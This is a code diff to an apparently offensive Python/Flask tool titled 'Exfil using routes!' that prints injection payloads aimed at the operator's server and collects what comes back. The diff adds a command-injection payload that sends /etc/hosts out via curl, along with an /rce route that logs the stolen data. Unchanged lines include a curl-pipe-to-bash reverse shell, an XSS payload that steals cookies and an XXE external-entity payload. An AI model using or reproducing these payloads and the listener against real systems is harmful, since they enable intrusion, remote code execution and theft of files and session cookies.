@@ -19,11 +19,12 @@ l={}
 def banner():
  print("""
 \033[38;5;208m** Exfil using routes! **\033[0m
-🔗: curl${IFS}http://%s
+🔗: ;;curl${IFS}http://%s
+💻: &&curl${IFS}http://%s/rce${IFS}-d"`cat${IFS}/etc/hosts`"
 🐚: ||curl${IFS}http://%s/rev/4444|bash
 🍪: <svg%%0Conload="\\u0064ocument.write('<img%%0Csrc=http://%s?c='%%2b\\u0064ocument.cookie%%2b'>')"/>
 🗂️: Content-Type: text/xml <?xml version="1.0"?><!DOCTYPE x SYSTEM "http://%s/dtd"><x>&e1;</x>
-"""%(ip,ip,ip,ip))
+"""%(ip,ip,ip,ip,ip))
 
 def rev(p):
  s=socket.socket()
@@ -51,6 +52,19 @@ def rev(p):
  c.close()
  print()
  banner()
+
+@app.route('/rce',methods=['GET','POST'])
+def rce():
+ v=request.get_data(as_text=True)or request.args.get('d','')
+ print('----------------------------------------------------')
+ print('\033[92mConnected\033[0m')
+ print('Host: '+request.remote_addr)
+ print('User-Agent: '+request.headers.get('User-Agent',''))
+ print('Value:')
+ print(v)
+ print('----------------------------------------------------')
+ print()
+ return'',204
 
 @app.route('/rev/<int:p>')
 def r(p):
